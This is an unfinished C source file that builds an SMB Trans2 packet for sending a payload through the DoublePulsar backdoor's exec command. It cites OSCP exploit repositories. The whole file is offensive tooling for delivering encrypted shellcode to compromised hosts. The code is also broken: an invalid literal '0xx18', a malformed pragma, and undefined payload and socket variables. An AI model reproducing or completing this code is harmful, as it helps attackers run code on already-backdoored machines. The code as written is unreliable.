
#pragma pack(1)
//https://devblogs.microsoft.com/oldnewthing/20200103-00/?p=103290
//https://stackoverflow.com/questions/3318410/pragma-pack-effect
typedef struct {
    unsigned char type;
    unsigned char flags;
    unsigned short length;
} NETBIOS_HEADER;

typedef struct {
    unsigned char protocol[4];
    unsigned char command;
    unsigned short status;
    unsigned char reserved;
    unsigned char  flags;
    unsigned short flags2;
    unsigned char  pad[12];
    unsigned short tid;
    unsigned short pid;
    unsigned short uid;
    unsigned short mid;
} SMB_HEADER;

typedef struct {
	uint8_t wordCount;              //setupcount(1) + wordcount (14)
	uint16_t totalParameterCount;
	uint16_t totalDataCount;
	uint16_t MaxParameterCount;
	uint16_t MaxDataCount;
	uint8_t MaxSetupCount;

	uint8_t reserved1;
	uint16_t flags1;
	uint32_t timeout;
	uint16_t reserved2;

	uint16_t ParameterCount;
	uint16_t ParamOffset;

	uint16_t DataCount;
	uint16_t DataOffset;
	uint8_t SetupCount;

	uint8_t reserved3;
	uint16_t subcommand; //0x0e00 also known as Subcommand in Wireshark
	uint16_t ByteCount; //4109 or 0x0d 0x10
	uint8_t padding;

	unsigned char SESSION_SETUP_PARAMETERS[13];
	unsigned char payload[4097];
} TRANS2_HEADER;
pragma pack(pop)


//https://github.com/ferreirasc/oscp/blob/master/xpl/trans2open.c
//https://github.com/KernelPan1k/trans2open-CVE-2003-0201/blob/master/trans2open.c
int doublepulsar_exec_main_packet()
{

	char buffer[4179];

	NETBIOS_HEADER  *netbiosheader;
	SMB_HEADER      *smbheader;
	TRANS2_HEADER      *trans2header;

	memset(buffer, 0x00, sizeof(buffer));

	netbiosheader   = (NETBIOS_HEADER *)buffer;
        smbheader       = (SMB_HEADER *)(buffer + sizeof(NETBIOS_HEADER));
	trans2header    = (TRANS2_HEADER *)(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER));

	netbiosheader->type 	= 0x00;         /* session message */
        netbiosheader->flags 	= 0x00;
	netbiosheader->length 	= htons(4178);	//length...4178

	smbheader->protocol[0] 	= 0xFF;
        smbheader->protocol[1] 	= 'S';
        smbheader->protocol[2] 	= 'M';
        smbheader->protocol[3] 	= 'B';

	smbheader->command 	= 0x32;         /* trans2 */
	smbheader->flags 	= 0xx18;
	smbheader->flags2 	= 0xC007;
	
	smbheader->pid 		= getpid() & 0xFFFF;
	smbheader->uid          = 100; //get value from Session Setup
	smbheader->tid		= 0x00; //get value from TreeConnect Request
	smbheader->mid 		= 0x42; //MID 66

	trans2header->wordCount = 15;
	trans2header->totalParameterCount = 12;
	trans2header->totalDataCount = 4096;
	trans2header->MaxParameterCount = 1;
	trans2header->MaxDataCount = 0;
	trans2header->MaxSetupCount = 0;
	trans2header->reserved1 = 0x00;
	trans2header->flags1 = 0x0000;
	trans2header->timeout = 0x25891a00;
	trans2header->reserved2 = 0x0000;
	trans2header->ParameterCount = 12;
	trans2header->ParamOffset = 66;
	trans2header->DataCount = 4096;
	trans2header->DataOffset = 78;
	trans2header->SetupCount = 1;
	trans2header->reserved3 = 0x00;
	trans2header->subcommand = 0x000e;
	trans2header->ByteCount = 4109;
	trans2header->padding = 0x00;
	
	//generate SESSION_SETUP_PARAMS HERE
	//copy from other code we just made yesterday
	unsigned char *params[13];
	//gen params here

	memcpy(trans2header->SESSION_SETUP_PARAMETERS, (unsigned char*)&params, 12);

	//generate ENCRYPTED DATA HERE
	//copy from other code we just made yesterday

	memcpy(trans2header->payload, (unsigned char*)&encrypted_payload, 4096);
	
	send(socket, buffer, 4178, 0);

	return 0;
}










